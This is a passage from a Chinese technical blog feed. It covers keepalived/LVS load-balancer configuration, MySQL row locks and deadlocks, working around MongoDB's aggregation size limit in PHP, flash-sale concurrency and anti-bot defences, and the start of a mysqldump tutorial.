&#125;</span><br><span class="line">        virtual_server 172.28.14.229 21 &#123;</span><br><span class="line">            delay_loop 6</span><br><span class="line">            lb_algo wlc</span><br><span class="line">            lb_kind DR                    # DR模式</span><br><span class="line">            persistence_timeout 50</span><br><span class="line">            protocol TCP</span><br><span class="line">            real_server 172.28.19.106 21 &#123;</span><br><span class="line">                weight 1                  # 权重（权重越高处理的请求越多）</span><br><span class="line">                TCP_CHECK &#123;</span><br><span class="line">                    connect_timeout 3</span><br><span class="line">                    nb\_get\_retry 3</span><br><span class="line">                    delay\_before\_retry 3</span><br><span class="line">                    connect_port 21</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            real_server 172.28.19.107 21 &#123;</span><br><span class="line">                weight 1                  # 权重（权重越高处理的请求越多）</span><br><span class="line">                TCP_CHECK &#123;</span><br><span class="line">                    connect_timeout 3</span><br><span class="line">                    nb\_get\_retry 3</span><br><span class="line">                    delay\_before\_retry 3</span><br><span class="line">                    connect_port 21</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            real_server 172.28.19.108 21 &#123;</span><br><span class="line">                weight 1                  # 权重（权重越高处理的请求越多）</span><br><span class="line">                TCP_CHECK &#123;</span><br><span class="line">                    connect_timeout 3</span><br><span class="line">                    nb\_get\_retry 3</span><br><span class="line">                    delay\_before\_retry 3</span><br><span class="line">                    connect_port 21</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>3、配置BACKUP BACKUP配置与MASTER基本一致，除了红色部分外，具体如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#cp &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf.bak</span><br><span class="line">#vi &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf vrrp\_instance VI\_1 &#123; state BACKP           </span><br><span class="line"># 状态实际BACKUP ... priority 99               </span><br><span class="line"># 优先级99（比MASTER优先级100低） ... &#125; 4、配置Realserver 为Realserver的某块网卡创建启动脚本，脚本内容如下：</span><br><span class="line"></span><br><span class="line"> #vi realserverd</span><br><span class="line">        #!&#x2F;bin&#x2F;bash</span><br><span class="line">        VIP&#x3D;172.28.14.227</span><br><span class="line">        . &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;functions</span><br><span class="line">        case &quot;$1&quot; in</span><br><span class="line">        start)</span><br><span class="line">            echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;lo&#x2F;arp_ignore</span><br><span class="line">            echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;lo&#x2F;arp_announce</span><br><span class="line">            echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;all&#x2F;arp_ignore</span><br><span class="line">            echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;all&#x2F;arp_announce</span><br><span class="line">            ifconfig lo:0 $VIP broadcast $VIP netmask 255.255.255.255 up</span><br><span class="line">            &#x2F;sbin&#x2F;route add -host $VIP dev lo:0</span><br><span class="line">            sysctl -p &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1</span><br><span class="line">            echo &quot;realserver start OK&quot;</span><br><span class="line">            ;;</span><br><span class="line">        stop)</span><br><span class="line">            echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;lo&#x2F;arp_ignore</span><br><span class="line">            echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;lo&#x2F;arp_announce</span><br><span class="line">            echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;all&#x2F;arp_ignore</span><br><span class="line">            echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;all&#x2F;arp_announce</span><br><span class="line">            ifconfig lo:0 down</span><br><span class="line">            &#x2F;sbin&#x2F;route del $VIP &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1</span><br><span class="line">            echo &quot;realserver stoped&quot;</span><br><span class="line">            ;;</span><br><span class="line">        *)</span><br><span class="line">            echo &quot;Usage:$0 &#123;start|stop&#125;&quot;</span><br><span class="line">            exit 1</span><br><span class="line">        esac</span><br><span class="line">        exit 0</span><br></pre></td></tr></table></figure>
<p>  注意脚本中红色部分，每块网卡绑定一个虚拟IP地址，如果绑定多个虚拟IP，则需要为每块网卡创建一个脚本，并且指定lo:X（比如：lo:0，lo:1等），另外，.和/etc/rc.d/funtions之间有空格。 启动keepalived服务，并执行上述脚本，然后用ip a能确认是否有VIP地址。 输入ipvsadm -Ln查看LVS工作状态。 停止MASTER的keepalived服务，BACKUP能接管VIP地址，再次启动MASTER的keepalived服务，MASTER又能再一次接管VIP地址。  <br>补充：              设置俩台服务器负载均衡以后，可以通过rsync来定时同步俩台服务器文件</p>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>WEB技术</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL中的共享锁与排它锁</title>
    <url>/2017/03/10/mysql%E4%B8%AD%E7%9A%84%E5%85%B1%E4%BA%AB%E9%94%81%E4%B8%8E%E6%8E%92%E5%AE%83%E9%94%81/</url>
    <content><![CDATA[<blockquote>
<p>记得原来面试不知道共享锁和排它锁被人鄙视了，顾单独放上一篇！</p>
</blockquote>
<p>行级锁分为共享锁和排他锁两种，本文将详细介绍共享锁及排他锁的概念、使用方式及注意事项等。</p>
<h2 id="共享锁-Share-Lock"><a href="#共享锁-Share-Lock" class="headerlink" title="共享锁(Share Lock)"></a>共享锁(Share Lock)</h2><p>共享锁又称读锁，是读取操作创建的锁。其他用户可以并发读取数据，但任何事务都不能对数据进行修改（获取数据上的排他锁），直到已释放所有共享锁。 如果事务T对数据A加上共享锁后，则其他事务只能对A再加共享锁，不能加排他锁。获准共享锁的事务只能读数据，不能修改数据。</p>
<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>SELECT … LOCK IN SHARE MODE; 在查询语句后面增加 <code>LOCK IN SHARE MODE</code> ，Mysql会对查询结果中的每行都加共享锁，当没有其他线程对查询结果集中的任何一行使用排他锁时，可以成功申请共享锁，否则会被阻塞。其他线程也可以读取使用了共享锁的表，而且这些线程读取的是同一个版本的数据。</p>
<h2 id="排他锁（eXclusive-Lock）"><a href="#排他锁（eXclusive-Lock）" class="headerlink" title="排他锁（eXclusive Lock）"></a>排他锁（eXclusive Lock）</h2><p>共享锁又称写锁，如果事务T对数据A加上排他锁后，则其他事务不能再对A加任任何类型的封锁。获准排他锁的事务既能读数据，又能修改数据。</p>
<h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><p>SELECT … FOR UPDATE; 在查询语句后面增加 <code>FOR UPDATE</code> ，Mysql会对查询结果中的每行都加排他锁，当没有其他线程对查询结果集中的任何一行使用排他锁时，可以成功申请排他锁，否则会被阻塞。</p>
<h2 id="意向锁"><a href="#意向锁" class="headerlink" title="意向锁"></a>意向锁</h2><p>InnoDB还有两个表锁： 意向共享锁（IS）：表示事务准备给数据行加入共享锁，也就是说一个数据行加共享锁前必须先取得该表的IS锁 意向排他锁（IX）：类似上面，表示事务准备给数据行加入排他锁，说明事务在一个数据行加排他锁前必须先取得该表的IX锁。</p>
<h4 id="意向锁是InnoDB自动加的，不需要用户干预。"><a href="#意向锁是InnoDB自动加的，不需要用户干预。" class="headerlink" title="意向锁是InnoDB自动加的，不需要用户干预。"></a>意向锁是InnoDB自动加的，不需要用户干预。</h4><p>对于insert、update、delete，InnoDB会自动给涉及的数据加排他锁（X）；对于一般的Select语句，InnoDB不会加任何锁，事务可以通过以下语句给显示加共享锁或排他锁。 共享锁： <code>SELECT ... LOCK IN SHARE MODE;</code> 排他锁： <code>SELECT ... FOR UPDATE;</code></p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h3 id="行级锁与表级锁"><a href="#行级锁与表级锁" class="headerlink" title="行级锁与表级锁"></a>行级锁与表级锁</h3><p>行级锁都是基于索引的，如果一条SQL语句用不到索引是不会使用行级锁的，会使用表级锁。行级锁的缺点是：由于需要请求大量的锁资源，所以速度慢，内存消耗大。</p>
<h3 id="行级锁与死锁"><a href="#行级锁与死锁" class="headerlink" title="行级锁与死锁"></a>行级锁与死锁</h3><p>MyISAM中是不会产生死锁的，因为MyISAM总是一次性获得所需的全部锁，要么全部满足，要么全部等待。而在InnoDB中，锁是逐步获得的，就造成了死锁的可能。 在MySQL中，行级锁并不是直接锁记录，而是锁索引。索引分为主键索引和非主键索引两种，如果一条sql语句操作了主键索引，MySQL就会锁定这条主键索引；如果一条语句操作了非主键索引，MySQL会先锁定该非主键索引，再锁定相关的主键索引。 在UPDATE、DELETE操作时，MySQL不仅锁定WHERE条件扫描过的所有索引记录，而且会锁定相邻的键值，即所谓的next-key locking。 当两个事务同时执行，一个锁住了逐渐索引在等待其他相关索引，一个锁定了非主键索引，在等待主键索引。这样就会发生死锁。 发生死锁后，InnoDB一般都可以检测到，并使一个事务释放锁回退，另一个获取锁完成事务。</p>
<h4 id="有多种方法可以避免死锁，这里只介绍常见的三种"><a href="#有多种方法可以避免死锁，这里只介绍常见的三种" class="headerlink" title="有多种方法可以避免死锁，这里只介绍常见的三种"></a>有多种方法可以避免死锁，这里只介绍常见的三种</h4><p>1、如果不同程序会并发存取多个表，尽量约定以相同的顺序访问表，可以大大降低死锁机会。 2、在同一个事务中，尽可能做到一次锁定所需要的所有资源，减少死锁产生概率； 3、对于非常容易产生死锁的业务部分，可以尝试使用升级锁定颗粒度，通过表级锁定来减少死锁产生的概率；</p>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>aggregation result exceeds maximum document size (16MB)</title>
    <url>/2017/03/10/aggregation-result-exceeds-maximum-document-size-16mb/</url>
    <content><![CDATA[<p>mongdb操作数据，数据格式如下，大概三百多条：</p>
<p>&gt; db.dcclog20170228.find().pretty().limit(1)<br>{<br>    “<em>id” : ObjectId(“58b7c5560717180be2ff0314”),<br>    “time” : 1488211200,<br>    “hour” : “00”,<br>    “ip” : “2947333517”,<br>    “cookieid” : “a74f75dac519271585c2e9bcf16f31ab”,<br>    “page” : “2bdb399e28604845ca1a2db96e066809”,<br>    “dcac” : 163,<br>    “dcv_0” : 9,<br>    “dcv_1” : 5,<br>    “dcv” : “9.5”,<br>    “dcvt” : [<br>        “1479222012”,<br>        “1488211162”,<br>        “1488211162”,<br>        “1488211162”,<br>        “1488211203”,<br>        “110”<br>    ],<br>    “dctp” : 1,<br>    “dcrf” : “m.baidu.com/from=844b/bd_page_type=1/ssid=0/uid=0/pu=sz%401320_2001%2Cta%40iphone_1_8.0_3_600%2Cusm%401/baiduid=262B871AB239F6D1108F0EC5971B6678/w=0_10</em>/t=iphone/l=1/tc?ref=www_iphone&amp;lid=14455673909231382786&amp;order=1&amp;fm=alop&amp;waplogo=1&amp;tj=www_normal_1_0_10_title&amp;vit=osres&amp;waput=1&amp;cltj=normal_title&amp;asres=1&amp;nt=wnor&amp;title=%E5%9B%BE%E4%BA%8C%E6%89%8B%E9%A9%AC%E8%87%AA%E8%BE%BE3%E4%B8%A4%E5%8E%A2_%E9%A9%AC%E8%87%AA%E8%BE%BE3%E4%B8%A4%E5%8E%A2%E4%BA%8C%E6%89%8B…_%E6%98%93%E8%BD%A6%E4%BA%8C%E6%89%8B%E8%BD%A6&amp;dict=-1&amp;w_qd=IlPT2AEptyoA_yk66ewbwge6BkdPlWgayEjCsPWUdxVw&amp;sec=19191&amp;di=1f88a683a4ebe1f1&amp;bdenc=1&amp;tch=124.1467.319.468.1.1132&amp;nsrc=IlPT2AEptyoA_yixCFOxXnANedT62v3IFw3UKydF0XSz96m7h44nJRhdXTqqAp73Gkf9xXiHhM9CbC8qQT2ek1EZebdmpK&amp;eqid=c89cded4bc9e70001000000358b44cce&amp;wd=&amp;clk_info=%7B%22srcid%22%3A%221599%22%2C%22tplname%22%3A%22www_normal%22%2C%22t%22%3A1488211160518%2C%22xpath%22%3A%22div-a-h3%22%7D”,<br>    “recomand_domain” : “5487”,<br>    “recomand_url” : 107835484,<br>    “dccv” : “null|1:page:mlist|1:prov:0|1:serial:2752|1:mbrand:18”,<br>    “provinceid” : 210000,<br>    “domain_id” : “2102”,<br>    “url_id” : 107977259<br>}</p>
<blockquote>
</blockquote>
<p>  需求时根据字段dccv拆分，但是数据量有300万条 语言使用PHP</p>
<p> // 1、PV<br>        $ops_pv = [<br>            [‘$match’ =&gt; [‘dccv’ =&gt; [‘$exists’ =&gt; true]]],<br>            [‘$group’ =&gt; [‘_id’    =&gt; [‘dcac’ =&gt; ‘$dcac’, ‘dccv’ =&gt; ‘$dccv’], ‘value’    =&gt; [‘$sum’ =&gt; 1]]],<br>        ];<br>        $mongo-&gt;collection($collection_name)-&gt;aggregate($ops_pv, [‘allowDiskUse’ =&gt; true]);</p>
<p>已经设置了将数据写到临时文件，但是出现报错信息：</p>
<p>aggregation result exceeds maximum document size (16MB)</p>
<p>超出了文档最大限制，顾先把数据临时输出到一个集合，只包含所需字段，</p>
<p> // 1、PV<br>        $ops_pv = [<br>            [‘$match’ =&gt; [‘dccv’ =&gt; [‘$exists’ =&gt; true]]],<br>            [‘$group’ =&gt; [‘_id’    =&gt; [‘dcac’ =&gt; ‘$dcac’, ‘dccv’ =&gt; ‘$dccv’], ‘value’    =&gt; [‘$sum’ =&gt; 1]]],<br>            [‘$out’=&gt;$tmp_name_pv],<br>        ];<br>        $mongo-&gt;collection($collection_name)-&gt;aggregate($ops_pv, [‘allowDiskUse’ =&gt; true]);<br>        $cur = $mongo-&gt;collection($tmp_name_pv)-&gt;find();<br>        while ($cur-&gt;hasNext()) {<br>            $v = $cur-&gt;getNext();<br>            //page全部数据<br>            $data_pv[implode(‘||’, $v[‘_id’])] = $v[‘value’];</p>
<pre><code>    &#125;</code></pre>
<p>  再从输出集合中逐条读取数据，减少内存消耗，程序正常运行。 基本思路就是化大为小，取整为零，数据是不变的</p>
]]></content>
      <categories>
        <category>MongoDB</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Web系统大规模并发——秒杀与抢购</title>
    <url>/2017/03/06/web%E7%B3%BB%E7%BB%9F%E5%A4%A7%E8%A7%84%E6%A8%A1%E5%B9%B6%E5%8F%91-%E7%A7%92%E6%9D%80%E4%B8%8E%E6%8A%A2%E8%B4%AD/</url>
    <content><![CDATA[<blockquote>
<p>电商的秒杀和抢购，对我们来说，都不是一个陌生的东西。然而，从技术的角度来说，这对于Web系统是一个巨大的考验。当一个Web系统，在一秒钟内收到数以万计甚至更多请求时，系统的优化和稳定至关重要。这次我们会关注秒杀和抢购的技术实现和优化，同时，从技术层面揭开，为什么我们总是不容易抢到火车票的原因？</p>
</blockquote>
<h2 id="一、大规模并发带来的挑战"><a href="#一、大规模并发带来的挑战" class="headerlink" title="一、大规模并发带来的挑战"></a>一、大规模并发带来的挑战</h2><p>在过去的工作中，我曾经面对过5w每秒的高并发秒杀功能，在这个过程中，整个Web系统遇到了很多的问题和挑战。如果Web系统不做针对性的优化，会轻而易举地陷入到异常状态。我们现在一起来讨论下，优化的思路和方法哈。</p>
<p><strong>1. 请求接口的合理设计</strong></p>
<p>一个秒杀或者抢购页面，通常分为2个部分，一个是静态的HTML等内容，另一个就是参与秒杀的Web后台请求接口。 通常静态HTML等内容，是通过CDN的部署，一般压力不大，核心瓶颈实际上在后台请求接口上。这个后端接口，必须能够支持高并发请求，同时，非常重要的一点，必须尽可能“快”，在最短的时间里返回用户的请求结果。为了实现尽可能快这一点，接口的后端存储使用内存级别的操作会更好一点。仍然直接面向MySQL之类的存储是不合适的，如果有这种复杂业务的需求，都建议采用异步写入。</p>
<p>当然，也有一些秒杀和抢购采用“滞后反馈”，就是说秒杀当下不知道结果，一段时间后才可以从页面中看到用户是否秒杀成功。但是，这种属于“偷懒”行为，同时给用户的体验也不好，容易被用户认为是“暗箱操作”。</p>
<p><strong>2. 高并发的挑战：一定要“快”</strong></p>
<p>我们通常衡量一个Web系统的吞吐率的指标是QPS（Query Per Second，每秒处理请求数），解决每秒数万次的高并发场景，这个指标非常关键。举个例子，我们假设处理一个业务请求平均响应时间为100ms，同时，系统内有20台Apache的Web服务器，配置MaxClients为500个（表示Apache的最大连接数目）。 那么，我们的Web系统的理论峰值QPS为（理想化的计算方式）： 20*500/0.1 = 100000 （10万QPS） 咦？我们的系统似乎很强大，1秒钟可以处理完10万的请求，5w/s的秒杀似乎是“纸老虎”哈。实际情况，当然没有这么理想。在高并发的实际场景下，机器都处于高负载的状态，在这个时候平均响应时间会被大大增加。 就Web服务器而言，Apache打开了越多的连接进程，CPU需要处理的上下文切换也越多，额外增加了CPU的消耗，然后就直接导致平均响应时间增加。因此上述的MaxClient数目，要根据CPU、内存等硬件因素综合考虑，绝对不是越多越好。可以通过Apache自带的abench来测试一下，取一个合适的值。然后，我们选择内存操作级别的存储的Redis，在高并发的状态下，存储的响应时间至关重要。网络带宽虽然也是一个因素，不过，这种请求数据包一般比较小，一般很少成为请求的瓶颈。负载均衡成为系统瓶颈的情况比较少，在这里不做讨论哈。 那么问题来了，假设我们的系统，在5w/s的高并发状态下，平均响应时间从100ms变为250ms（实际情况，甚至更多）： 20*500/0.25 = 40000 （4万QPS） 于是，我们的系统剩下了4w的QPS，面对5w每秒的请求，中间相差了1w。 然后，这才是真正的恶梦开始。举个例子，高速路口，1秒钟来5部车，每秒通过5部车，高速路口运作正常。突然，这个路口1秒钟只能通过4部车，车流量仍然依旧，结果必定出现大塞车。（5条车道忽然变成4条车道的感觉） 同理，某一个秒内，20*500个可用连接进程都在满负荷工作中，却仍然有1万个新来请求，没有连接进程可用，系统陷入到异常状态也是预期之内。</p>
<p>其实在正常的非高并发的业务场景中，也有类似的情况出现，某个业务请求接口出现问题，响应时间极慢，将整个Web请求响应时间拉得很长，逐渐将Web服务器的可用连接数占满，其他正常的业务请求，无连接进程可用。 更可怕的问题是，是用户的行为特点，系统越是不可用，用户的点击越频繁，恶性循环最终导致“雪崩”（其中一台Web机器挂了，导致流量分散到其他正常工作的机器上，再导致正常的机器也挂，然后恶性循环），将整个Web系统拖垮。</p>
<p><strong>3. 重启与过载保护</strong></p>
<p>如果系统发生“雪崩”，贸然重启服务，是无法解决问题的。最常见的现象是，启动起来后，立刻挂掉。这个时候，最好在入口层将流量拒绝，然后再将重启。如果是redis/memcache这种服务也挂了，重启的时候需要注意“预热”，并且很可能需要比较长的时间。 秒杀和抢购的场景，流量往往是超乎我们系统的准备和想象的。这个时候，过载保护是必要的。如果检测到系统满负载状态，拒绝请求也是一种保护措施。在前端设置过滤是最简单的方式，但是，这种做法是被用户“千夫所指”的行为。更合适一点的是，将过载保护设置在CGI入口层，快速将客户的直接请求返回。</p>
<h2 id="二、作弊的手段：进攻与防守"><a href="#二、作弊的手段：进攻与防守" class="headerlink" title="二、作弊的手段：进攻与防守"></a>二、作弊的手段：进攻与防守</h2><blockquote>
<p>秒杀和抢购收到了“海量”的请求，实际上里面的水分是很大的。不少用户，为了“抢“到商品，会使用“刷票工具”等类型的辅助工具，帮助他们发送尽可能多的请求到服务器。还有一部分高级用户，制作强大的自动请求脚本。这种做法的理由也很简单，就是在参与秒杀和抢购的请求中，自己的请求数目占比越多，成功的概率越高。 这些都是属于“作弊的手段”，不过，有“进攻”就有“防守”，这是一场没有硝烟的战斗哈。</p>
</blockquote>
<p><strong>1. 同一个账号，一次性发出多个请求</strong></p>
<p>部分用户通过浏览器的插件或者其他工具，在秒杀开始的时间里，以自己的账号，一次发送上百甚至更多的请求。实际上，这样的用户破坏了秒杀和抢购的公平性。 这种请求在某些没有做数据安全处理的系统里，也可能造成另外一种破坏，导致某些判断条件被绕过。例如一个简单的领取逻辑，先判断用户是否有参与记录，如果没有则领取成功，最后写入到参与记录中。这是个非常简单的逻辑，但是，在高并发的场景下，存在深深的漏洞。多个并发请求通过负载均衡服务器，分配到内网的多台Web服务器，它们首先向存储发送查询请求，然后，在某个请求成功写入参与记录的时间差内，其他的请求获查询到的结果都是“没有参与记录”。这里，就存在逻辑判断被绕过的风险。</p>
<p> <strong>应对方案：</strong></p>
<p> 在程序入口处，一个账号只允许接受1个请求，其他请求过滤。不仅解决了同一个账号，发送N个请求的问题，还保证了后续的逻辑流程的安全。实现方案，可以通过Redis这种内存缓存服务，写入一个标志位（只允许1个请求写成功，结合watch的乐观锁的特性），成功写入的则可以继续参加。  或者，自己实现一个服务，将同一个账号的请求放入一个队列中，处理完一个，再处理下一个。</p>
<p> <strong>2. 多个账号，一次性发送多个请求</strong></p>
<p> 很多公司的账号注册功能，在发展早期几乎是没有限制的，很容易就可以注册很多个账号。因此，也导致了出现了一些特殊的工作室，通过编写自动注册脚本，积累了一大批“僵尸账号”，数量庞大，几万甚至几十万的账号不等，专门做各种刷的行为（这就是微博中的“僵尸粉“的来源）。举个例子，例如微博中有转发抽奖的活动，如果我们使用几万个“僵尸号”去混进去转发，这样就可以大大提升我们中奖的概率。 这种账号，使用在秒杀和抢购里，也是同一个道理。例如，iPhone官网的抢购，火车票黄牛党。</p>
<p><strong>应对方案：</strong></p>
<p>这种场景，可以通过检测指定机器IP请求频率就可以解决，如果发现某个IP请求频率很高，可以给它弹出一个验证码或者直接禁止它的请求：</p>
<ol>
<li>弹出验证码，最核心的追求，就是分辨出真实用户。因此，大家可能经常发现，网站弹出的验证码，有些是“鬼神乱舞”的样子，有时让我们根本无法看清。他们这样做的原因，其实也是为了让验证码的图片不被轻易识别，因为强大的“自动脚本”可以通过图片识别里面的字符，然后让脚本自动填写验证码。实际上，有一些非常创新的验证码，效果会比较好，例如给你一个简单问题让你回答，或者让你完成某些简单操作（例如百度贴吧的验证码）。</li>
<li>直接禁止IP，实际上是有些粗暴的，因为有些真实用户的网络场景恰好是同一出口IP的，可能会有“误伤“。但是这一个做法简单高效，根据实际场景使用可以获得很好的效果。</li>
</ol>
<p><strong>3. 多个账号，不同IP发送不同请求</strong></p>
<p>所谓道高一尺，魔高一丈。有进攻，就会有防守，永不休止。这些“工作室”，发现你对单机IP请求频率有控制之后，他们也针对这种场景，想出了他们的“新进攻方案”，就是不断改变IP。  有同学会好奇，这些随机IP服务怎么来的。有一些是某些机构自己占据一批独立IP，然后做成一个随机代理IP的服务，有偿提供给这些“工作室”使用。还有一些更为黑暗一点的，就是通过木马黑掉普通用户的电脑，这个木马也不破坏用户电脑的正常运作，只做一件事情，就是转发IP包，普通用户的电脑被变成了IP代理出口。通过这种做法，黑客就拿到了大量的独立IP，然后搭建为随机IP服务，就是为了挣钱。</p>
<p> <strong>应对方案：</strong></p>
<p> 说实话，这种场景下的请求，和真实用户的行为，已经基本相同了，想做分辨很困难。再做进一步的限制很容易“误伤“真实用户，这个时候，通常只能通过设置业务门槛高来限制这种请求了，或者通过账号行为的”数据挖掘“来提前清理掉它们。 僵尸账号也还是有一些共同特征的，例如账号很可能属于同一个号码段甚至是连号的，活跃度不高，等级低，资料不全等等。根据这些特点，适当设置参与门槛，例如限制参与秒杀的账号等级。通过这些业务手段，也是可以过滤掉一些僵尸号。</p>
<p> <strong>4. 火车票的抢购</strong></p>
<p> 看到这里，同学们是否明白你为什么抢不到火车票？如果你只是老老实实地去抢票，真的很难。通过多账号的方式，火车票的黄牛将很多车票的名额占据，部分强大的黄牛，在处理验证码方面，更是“技高一筹“。 高级的黄牛刷票时，在识别验证码的时候使用真实的人，中间搭建一个展示验证码图片的中转软件服务，真人浏览图片并填写下真实验证码，返回给中转软件。对于这种方式，验证码的保护限制作用被废除了，目前也没有很好的解决方案。</p>
<p>因为火车票是根据身份证实名制的，这里还有一个火车票的转让操作方式。大致的操作方式，是先用买家的身份证开启一个抢票工具，持续发送请求，黄牛账号选择退票，然后黄牛买家成功通过自己的身份证购票成功。当一列车厢没有票了的时候，是没有很多人盯着看的，况且黄牛们的抢票工具也很强大，即使让我们看见有退票，我们也不一定能抢得过他们哈。  最终，黄牛顺利将火车票转移到买家的身份证下。</p>
<p><strong>解决方案：</strong></p>
<p>并没有很好的解决方案，唯一可以动心思的也许是对账号数据进行“数据挖掘”，这些黄牛账号也是有一些共同特征的，例如经常抢票和退票，节假日异常活跃等等。将它们分析出来，再做进一步处理和甄别。</p>
<h2 id="三、高并发下的数据安全"><a href="#三、高并发下的数据安全" class="headerlink" title="三、高并发下的数据安全"></a>三、高并发下的数据安全</h2><p>我们知道在多线程写入同一个文件的时候，会存现“线程安全”的问题（多个线程同时运行同一段代码，如果每次运行结果和单线程运行的结果是一样的，结果和预期相同，就是线程安全的）。如果是MySQL数据库，可以使用它自带的锁机制很好的解决问题，但是，在大规模并发的场景中，是不推荐使用MySQL的。秒杀和抢购的场景中，还有另外一个问题，就是“超发”，如果在这方面控制不慎，会产生发送过多的情况。我们也曾经听说过，某些电商搞抢购活动，买家成功拍下后，商家却不承认订单有效，拒绝发货。这里的问题，也许并不一定是商家奸诈，而是系统技术层面存在超发风险导致的。</p>
<p><strong>1. 超发的原因</strong></p>
<p>假设某个抢购场景中，我们一共只有100个商品，在最后一刻，我们已经消耗了99个商品，仅剩最后一个。这个时候，系统发来多个并发请求，这批请求读取到的商品余量都是99个，然后都通过了这一个余量判断，最终导致超发。（同文章前面说的场景）就导致了并发用户B也“抢购成功”，多让一个人获得了商品。这种场景，在高并发的情况下非常容易出现。</p>
<p><strong>2. 悲观锁思路</strong></p>
<p>解决线程安全的思路很多，可以从“悲观锁”的方向开始讨论。 悲观锁，也就是在修改数据的时候，采用锁定状态，排斥外部请求的修改。遇到加锁的状态，就必须等待。</p>
<p>虽然上述的方案的确解决了线程安全的问题，但是，别忘记，我们的场景是“高并发”。也就是说，会很多这样的修改请求，每个请求都需要等待“锁”，某些线程可能永远都没有机会抢到这个“锁”，这种请求就会死在那里。同时，这种请求会很多，瞬间增大系统的平均响应时间，结果是可用连接数被耗尽，系统陷入异常。</p>
<p><strong>3. FIFO队列思路</strong></p>
<p>那好，那么我们稍微修改一下上面的场景，我们直接将请求放入队列中的，采用FIFO（First Input First Output，先进先出），这样的话，我们就不会导致某些请求永远获取不到锁。看到这里，是不是有点强行将多线程变成单线程的感觉哈。 然后，我们现在解决了锁的问题，全部请求采用“先进先出”的队列方式来处理。那么新的问题来了，高并发的场景下，因为请求很多，很可能一瞬间将队列内存“撑爆”，然后系统又陷入到了异常状态。或者设计一个极大的内存队列，也是一种方案，但是，系统处理完一个队列内请求的速度根本无法和疯狂涌入队列中的数目相比。也就是说，队列内的请求会越积累越多，最终Web系统平均响应时候还是会大幅下降，系统还是陷入异常。</p>
<p><strong>4. 乐观锁思路</strong></p>
<p>这个时候，我们就可以讨论一下“乐观锁”的思路了。乐观锁，是相对于“悲观锁”采用更为宽松的加锁机制，大都是采用带版本号（Version）更新。实现就是，这个数据所有请求都有资格去修改，但会获得一个该数据的版本号，只有版本号符合的才能更新成功，其他的返回抢购失败。这样的话，我们就不需要考虑队列的问题，不过，它会增大CPU的计算开销。但是，综合来说，这是一个比较好的解决方案。<br> 有很多软件和服务都“乐观锁”功能的支持，例如Redis中的watch就是其中之一。通过这个实现，我们保证了数据的安全。</p>
<h2 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h2><p> 互联网正在高速发展，使用互联网服务的用户越多，高并发的场景也变得越来越多。电商秒杀和抢购，是两个比较典型的互联网高并发场景。虽然我们解决问题的具体技术方案可能千差万别，但是遇到的挑战却是相似的，因此解决问题的思路也异曲同工。</p>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>程序设计</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql导入导出详解</title>
    <url>/2017/02/24/mysql%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>有时数据由于业务和历史数据原因，可能做优化调整，例如分表分库，百万级别的数据mysql还是可以应付的，但是有些业务可能是按天增长的，比如网站报告等等，每天的数据总量都会按一定的规律增长，数据量可能会达到千万级别甚至过亿，这时如果拆分使用<strong>insert select操作会导致当前表处于锁状态</strong>，会影响业务。 <strong>一、mysql导出有俩种方式：</strong></p>
<p>1、mysqldump命令</p>
<blockquote>
<p>/usr/local/mysql/product/bin/mysqldump  -u tracking_createtable   -p Pmw99AU -t   auto_tracking auto_url -w “id&lt;125806272 and web_id=163” &gt;/data/auto_url_163.sql</p>
</blockquote>
<p>具体参数详解如下</p>
<p>·         –add-drop–database</p>
<p>在每个CREATE DATABASE语句前添加DROP DATABASE语句。</p>
<p>·         –add-drop-tables</p>
<p>在每个CREATE TABLE语句前添加DROP TABLE语句。</p>
<p>·         –add-locking</p>
<p>用LOCK TABLES和UNLOCK TABLES语句引用每个表转储。重载转储文件时插入得更快。</p>
<p>·         –all–database，-A</p>
<p>转储所有数据库中的所有表。与使用—database选项相同，在命令行中命名所有数据库。</p>
<p>·         –allow-keywords</p>
<p>允许创建关键字列名。应在每个列名前面加上表名前缀。</p>
<p>·         —comments[={0|1}]</p>
<p>如果设置为 0，禁止转储文件中的其它信息，例如程序版本、服务器版本和主机。–skip—comments与—comments=0的结果相同。 默认值为1，即包括额外信息。</p>
